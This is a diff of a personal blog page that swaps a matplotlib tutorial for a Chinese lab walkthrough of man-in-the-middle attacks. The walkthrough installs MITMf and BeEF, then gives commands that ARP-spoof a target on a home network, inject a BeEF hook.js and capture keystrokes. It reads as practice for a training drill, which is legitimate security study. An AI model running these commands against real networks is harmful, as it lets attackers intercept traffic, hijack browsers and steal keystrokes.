@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Python," />
+  <meta name="keywords" content="中间人攻击," />
 
 
 
@@ -79,24 +79,26 @@
 
 
 
-<meta name="description" content="折线图12345import matplotlib.pyplot as pltyear=[1950,1970,1990,2010]pop=[2.519,3.692,5.263,6.972]plt.plot(year,pop)plt.show()">
-<meta name="keywords" content="Python">
+<meta name="description" content="过几天貌似需要实战演练无线攻击，今天晚上恰好没事做，先搭建环境简单模拟一下。 这里用到的是Mitmf，Mitmf 是一款强大的中间人攻击的工具，可以用来注入js脚本，可以结合beef的hook来一起使用，Kali 2.0中已经默认个移除了这个工具，在安装之前，需要先解决它的依赖问题： 1apt-get install python-dev python-setuptools libpcap0.8-">
+<meta name="keywords" content="中间人攻击">
 <meta property="og:type" content="article">
-<meta property="og:title" content="用matplotlib画图">
-<meta property="og:url" content="http://nickzhoulin.github.io/2017/12/12/page171212/index.html">
+<meta property="og:title" content="Mitmf中间人攻击">
+<meta property="og:url" content="http://nickzhoulin.github.io/2018/09/25/page180925/index.html">
 <meta property="og:site_name" content="Nick&#39; 的博客">
-<meta property="og:description" content="折线图12345import matplotlib.pyplot as pltyear=[1950,1970,1990,2010]pop=[2.519,3.692,5.263,6.972]plt.plot(year,pop)plt.show()">
+<meta property="og:description" content="过几天貌似需要实战演练无线攻击，今天晚上恰好没事做，先搭建环境简单模拟一下。 这里用到的是Mitmf，Mitmf 是一款强大的中间人攻击的工具，可以用来注入js脚本，可以结合beef的hook来一起使用，Kali 2.0中已经默认个移除了这个工具，在安装之前，需要先解决它的依赖问题： 1apt-get install python-dev python-setuptools libpcap0.8-">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20171212-01.JPG">
-<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20171212-02.JPG">
-<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20171212-03.JPG">
-<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20171212-04.JPG">
-<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20171212-05.JPG">
-<meta property="og:updated_time" content="2017-12-13T11:53:24.557Z">
+<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20180925-01.png">
+<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20180925-02.png">
+<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20180925-03.png">
+<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20180925-04.png">
+<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20180925-05.png">
+<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20180925-06.png">
+<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20180925-07.png">
+<meta property="og:updated_time" content="2018-09-25T14:24:38.100Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="用matplotlib画图">
-<meta name="twitter:description" content="折线图12345import matplotlib.pyplot as pltyear=[1950,1970,1990,2010]pop=[2.519,3.692,5.263,6.972]plt.plot(year,pop)plt.show()">
-<meta name="twitter:image" content="http://oz3okd76o.bkt.clouddn.com/20171212-01.JPG">
+<meta name="twitter:title" content="Mitmf中间人攻击">
+<meta name="twitter:description" content="过几天貌似需要实战演练无线攻击，今天晚上恰好没事做，先搭建环境简单模拟一下。 这里用到的是Mitmf，Mitmf 是一款强大的中间人攻击的工具，可以用来注入js脚本，可以结合beef的hook来一起使用，Kali 2.0中已经默认个移除了这个工具，在安装之前，需要先解决它的依赖问题： 1apt-get install python-dev python-setuptools libpcap0.8-">
+<meta name="twitter:image" content="http://oz3okd76o.bkt.clouddn.com/20180925-01.png">
 
 
 
@@ -126,13 +128,13 @@
 
 
 
-  <link rel="canonical" href="http://nickzhoulin.github.io/2017/12/12/page171212/"/>
+  <link rel="canonical" href="http://nickzhoulin.github.io/2018/09/25/page180925/"/>
 
 
 
 
 
-  <title>用matplotlib画图 | Nick' 的博客</title>
+  <title>Mitmf中间人攻击 | Nick' 的博客</title>
   
 
 
@@ -259,7 +261,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://nickzhoulin.github.io/2017/12/12/page171212/">
+    <link itemprop="mainEntityOfPage" href="http://nickzhoulin.github.io/2018/09/25/page180925/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Nick">
@@ -276,7 +278,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">用matplotlib画图</h1>
+          <h1 class="post-title" itemprop="name headline">Mitmf中间人攻击</h1>
         
 
         <div class="post-meta">
@@ -288,8 +290,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-12T11:23:23+08:00">
-                2017-12-12
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-25T22:00:32+08:00">
+                2018-09-25
               </time>
             
 
@@ -311,8 +313,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Python/" itemprop="url" rel="index">
-                    <span itemprop="name">Python</span>
+                  <a href="/categories/资料/" itemprop="url" rel="index">
+                    <span itemprop="name">资料</span>
                   </a>
                 </span>
 
@@ -348,17 +350,34 @@
       
 
       
-        <h5 id="折线图"><a href="#折线图" class="headerlink" title="折线图"></a>折线图</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</div><div class="line">year=[<span class="number">1950</span>,<span class="number">1970</span>,<span class="number">1990</span>,<span class="number">2010</span>]</div><div class="line">pop=[<span class="number">2.519</span>,<span class="number">3.692</span>,<span class="number">5.263</span>,<span class="number">6.972</span>]</div><div class="line">plt.plot(year,pop)</div><div class="line">plt.show()</div></pre></td></tr></table></figure>
+        <p>过几天貌似需要实战演练无线攻击，今天晚上恰好没事做，先搭建环境简单模拟一下。</p>
+<p>这里用到的是Mitmf，Mitmf 是一款强大的中间人攻击的工具，可以用来注入js脚本，可以结合beef的hook来一起使用，Kali 2.0中已经默认个移除了这个工具，在安装之前，需要先解决它的依赖问题：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file</div></pre></td></tr></table></figure>
 <a id="more"></a>
-<p><img src="http://oz3okd76o.bkt.clouddn.com/20171212-01.JPG" alt=""></p>
-<h5 id="散点图"><a href="#散点图" class="headerlink" title="散点图"></a>散点图</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</div><div class="line">year=[<span class="number">1950</span>,<span class="number">1970</span>,<span class="number">1990</span>,<span class="number">2010</span>]</div><div class="line">pop=[<span class="number">2.519</span>,<span class="number">3.692</span>,<span class="number">5.263</span>,<span class="number">6.972</span>]</div><div class="line">plt.scatter(year,pop)</div><div class="line">plt.show()</div></pre></td></tr></table></figure>
-<p><img src="http://oz3okd76o.bkt.clouddn.com/20171212-02.JPG" alt=""></p>
-<h4 id="3D"><a href="#3D" class="headerlink" title="3D"></a>3D</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</div><div class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line"><span class="keyword">from</span> mpl_toolkits.mplot3d <span class="keyword">import</span> Axes3D</div><div class="line"></div><div class="line">fig = plt.figure()</div><div class="line">ax = Axes3D(fig)</div><div class="line">X = np.arange(<span class="number">-4</span>, <span class="number">4</span>, <span class="number">0.25</span>)</div><div class="line">Y = np.arange(<span class="number">-4</span>, <span class="number">4</span>, <span class="number">0.25</span>)</div><div class="line">X, Y = np.meshgrid(X, Y)</div><div class="line">R = np.sqrt(X**<span class="number">2</span> + Y**<span class="number">2</span>)</div><div class="line">Z = np.sin(R)</div><div class="line"></div><div class="line"><span class="comment"># 具体函数方法可用 help(function) 查看，如：help(ax.plot_surface)</span></div><div class="line">ax.plot_surface(X, Y, Z, rstride=<span class="number">1</span>, cstride=<span class="number">1</span>, cmap=<span class="string">'rainbow'</span>)</div><div class="line"></div><div class="line">plt.show()</div></pre></td></tr></table></figure>
-<p><img src="http://oz3okd76o.bkt.clouddn.com/20171212-03.JPG" alt=""></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np  </div><div class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt  </div><div class="line"><span class="keyword">import</span> mpl_toolkits.mplot3d  </div><div class="line">  </div><div class="line">x,y=np.mgrid[<span class="number">-2</span>:<span class="number">2</span>:<span class="number">20j</span>,<span class="number">-2</span>:<span class="number">2</span>:<span class="number">20j</span>]  </div><div class="line">z=x*np.exp(-x**<span class="number">2</span>-y**<span class="number">2</span>)  </div><div class="line">   </div><div class="line">ax=plt.subplot(<span class="number">111</span>,projection=<span class="string">'3d'</span>)  </div><div class="line">ax.plot_surface(x,y,z,rstride=<span class="number">2</span>,cstride=<span class="number">1</span>,cmap=plt.cm.coolwarm,alpha=<span class="number">0.8</span>)  </div><div class="line">ax.set_xlabel(<span class="string">'x'</span>)  </div><div class="line">ax.set_ylabel(<span class="string">'y'</span>)  </div><div class="line">ax.set_zlabel(<span class="string">'z'</span>)  </div><div class="line">  </div><div class="line">plt.show()</div></pre></td></tr></table></figure>
-<p><img src="http://oz3okd76o.bkt.clouddn.com/20171212-04.JPG" alt=""></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</div><div class="line"><span class="keyword">from</span> mpl_toolkits.mplot3d <span class="keyword">import</span> Axes3D</div><div class="line"></div><div class="line">fig = plt.figure()</div><div class="line">ax = Axes3D(fig)</div><div class="line">X = np.arange(<span class="number">-4</span>, <span class="number">4</span>, <span class="number">0.25</span>)</div><div class="line">Y = np.arange(<span class="number">-4</span>, <span class="number">4</span>, <span class="number">0.25</span>)</div><div class="line">X, Y = np.meshgrid(X, Y)</div><div class="line">R = np.sqrt(X**<span class="number">2</span> + Y**<span class="number">2</span>)</div><div class="line">Z = np.sin(R)</div><div class="line"></div><div class="line">ax.plot_surface(X, Y, Z, rstride=<span class="number">1</span>, cstride=<span class="number">1</span>, cmap=plt.cm.hot)</div><div class="line">ax.contourf(X, Y, Z, zdir=<span class="string">'z'</span>, offset=<span class="number">-2</span>, cmap=plt.cm.hot)</div><div class="line">ax.set_zlim(<span class="number">-2</span>,<span class="number">2</span>)</div><div class="line"></div><div class="line"><span class="comment"># savefig('../figures/plot3d_ex.png',dpi=48)</span></div><div class="line">plt.show()</div></pre></td></tr></table></figure>
-<p><img src="http://oz3okd76o.bkt.clouddn.com/20171212-05.JPG" alt=""></p>
+<p><img src="http://oz3okd76o.bkt.clouddn.com/20180925-01.png" alt=""></p>
+<p>依赖安装完成后就可以安装Mitmf了:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install mitmf</div></pre></td></tr></table></figure>
+<p><img src="http://oz3okd76o.bkt.clouddn.com/20180925-02.png" alt=""></p>
+<p>安装完后还需要安装一给用于兼容的东西twisted,如果系统之前安装过那么先卸载一下，重新安装：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip uninstall twisted</div></pre></td></tr></table></figure>
+<p><img src="http://oz3okd76o.bkt.clouddn.com/20180925-03.png" alt=""></p>
+<p>下载twisted最新版本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wget -d https://twistedmatrix.com/Releases/Twisted/18.7/Twisted-18.7.0.tar.bz2</div></pre></td></tr></table></figure>
+<p>使用pip命令进行安装：</p>
+<p><img src="http://oz3okd76o.bkt.clouddn.com/20180925-04.png" alt=""></p>
+<p>到此为止可以正常的使用Mitmf了，运行beef来调用beef的hook脚本，之前kali 一直都是自带beef的，刚刚直接运行beef命令发现还没有安装，如果系统里面没有beef的话运行如下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">apt-get install beef     #安装</div><div class="line">cd /usr/share/beef-xss/  #切换到目录</div><div class="line">./beef                   #运行beef</div></pre></td></tr></table></figure>
+<p><img src="http://oz3okd76o.bkt.clouddn.com/20180925-05.png" alt=""></p>
+<p>beef默认的账号和密码都为beef,可以在浏览器中查看。</p>
+<p><img src="http://oz3okd76o.bkt.clouddn.com/20180925-06.png" alt=""></p>
+<p>下面使用mitmf进行中间人攻击。输入命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mitmf --spoof --arp -i wlan0 --gateway 192.168.1.1 --target 192.168.1.4 --inject --js-url http://192.168.1.4:3000/hook.js</div></pre></td></tr></table></figure>
+<p><img src="http://oz3okd76o.bkt.clouddn.com/20180925-07.png" alt=""></p>
+<p>这里有个地方需要注意一下，target是目标ip,我刚刚一开始一直以为是本机ip,攻击没反应，过了几分钟才回过神来。</p>
+<p>除了注入脚本，mitmf还自带了许多功能，如键盘记录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mitmf --spoof --arp -i wlan0 --gateway 192.168.1.1 --target 192.168.1.5 --jskeylogger</div></pre></td></tr></table></figure>
+<p>网页图片翻转180度</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mitmf --spoof --arp -i wlan0 --gateway 192.168.1.1 --target 192.168.1.5 --upsidedownternet</div></pre></td></tr></table></figure>
 
       
     </div>
@@ -376,7 +395,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Python/" rel="tag"># Python</a>
+            <a href="/tags/中间人攻击/" rel="tag"># 中间人攻击</a>
           
         </div>
       
@@ -389,8 +408,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/12/11/page171211/" rel="next" title="Python爬取子域名">
-                <i class="fa fa-chevron-left"></i> Python爬取子域名
+              <a href="/2018/09/24/page180924/" rel="next" title="Hadoop参数调优">
+                <i class="fa fa-chevron-left"></i> Hadoop参数调优
               </a>
             
           </div>
@@ -398,10 +417,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/12/13/page171213/" rel="prev" title="numpy基本用法">
-                numpy基本用法 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -453,17 +468,8 @@
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
 
-      <section class="site-overview-wrap sidebar-panel">
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -529,22 +535,6 @@
         </div>
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-5"><a class="nav-link" href="#折线图"><span class="nav-number">1.</span> <span class="nav-text">折线图</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#散点图"><span class="nav-number">2.</span> <span class="nav-text">散点图</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3D"><span class="nav-number"></span> <span class="nav-text">3D</span></a></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
       
